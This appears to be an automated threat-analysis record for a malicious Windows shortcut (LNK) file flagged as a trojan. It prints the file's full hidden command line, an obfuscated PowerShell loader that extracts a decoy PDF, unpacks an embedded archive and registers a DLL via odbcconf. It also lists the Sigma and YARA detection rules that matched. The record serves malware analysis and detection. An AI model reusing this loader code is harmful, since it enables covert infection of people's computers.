attributes.magic: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=13, Archive, ctime=Sun May 26 07:02:09 2024, mtime=Thu Sep 26 09:18:46 2024, atime=Sun May 26 07:02:09 2024, length=867840, window=hidenormalshowminimized

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

exiftool.CommandLineArguments: conhost --headless cmd /c FOR /F "delims=s\ tokens=4" %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Arda.pdf';$pdl='Arda.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'...
exiftool.Flags: IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpIcon

lnk_info.command_line_arguments: conhost --headless cmd /c FOR /F "delims=s\ tokens=4" %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Arda.pdf';$pdl='Arda.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar,$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd,[System.IO.FileMode]::Create);$s.Write($nb,0,($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr "Wow"`} ;

sigma_analysis_results.rule_description: Detects uncommon "conhost" child processes. This could be a sign of "conhost" usage as a LOLBIN or potential process injection activity.

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies archive (compressed) files in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with a long relative path. Might be used in an attempt to hide the path.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with equal or higher entropy than 6.5. Most goodware LNK files have a low entropy, lower than 6.
crowdsourced_yara_results.author: @bartblaze
